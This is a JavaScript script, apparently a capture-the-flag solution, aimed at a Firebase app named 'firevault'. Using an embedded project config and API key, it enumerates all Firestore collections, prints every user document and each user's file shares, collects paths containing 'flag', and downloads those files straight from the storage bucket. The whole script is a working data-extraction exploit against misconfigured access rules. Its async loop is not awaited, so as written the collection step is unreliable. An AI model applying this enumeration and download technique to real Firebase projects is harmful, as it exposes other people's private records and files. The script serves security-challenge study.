const firebase = require("firebase-admin");
const axios = require("axios").default;

const config = {
  apiKey: "AIzaSyAHI0WKAEz6V_LXjQEDy7jaPG5sVN0UYss",
  authDomain: "firevault-1a5bc.firebaseapp.com",
  projectId: "firevault-1a5bc",
  storageBucket: "firevault-1a5bc.appspot.com",
  messagingSenderId: "459820124037",
  appId: "1:459820124037:web:6c173f913aac55394ca6ec",
  measurementId: "G-5RT5JH07YK",
};

firebase.initializeApp(config);

async function main() {
  const db = firebase.firestore();

  // Find out what collections we have
  const collections = await db.listCollections();
  const collectionNames = collections.map((collectionRef) => {
    return collectionRef.id;
  });
  console.log(collectionNames);

  // Explore the user collection
  const userColRef = db.collection("users");
  const userColDocRefs = await userColRef.listDocuments();
  const userColDocNames = userColDocRefs.map((userColDocRef) => {
    return userColDocRef.id;
  });
  console.log(userColDocNames);

  // Enumerate the fields on users
  for (const userDocRef of userColDocRefs) {
    const doc = await userDocRef.get();
    console.log(doc.data());

    // Enumerate the collections of users
    const userDocCols = await userDocRef.listCollections();
    const userDocColNames = userDocCols.map((userDocCol) => {
      return userDocCol.id;
    });
    console.log(userDocColNames);
  }

  const flags = [];
  // Enumerate the shares of each user and get potential flags
  for (const userRef of userColDocRefs) {
    const sharesRef = userRef.collection("shares");
    const userShares = await sharesRef.listDocuments();

    // Get the share names and data
    userShares.forEach(async (share) => {
      console.log(share.id);
      const shareData = (await share.get()).data();
      console.log(shareData);

      for (const file of shareData.files) {
        if (file.path.toLowerCase().includes("flag")) {
          flags.push(file.path);
        }
      }
    });
  }

  console.log(flags);

  // We can now download these via https://firebasestorage.googleapis.com/v0/b/firevault-1a5bc.appspot.com/o/${path}?alt=media
  // as seen by interacting with the app
  for (const flag of flags) {
    const path = encodeURIComponent(flag);
    const res = await axios.get(
      `https://firebasestorage.googleapis.com/v0/b/firevault-1a5bc.appspot.com/o/${path}?alt=media`,
    );

    const data = res.data;
    console.log(data);
  }
}

main();
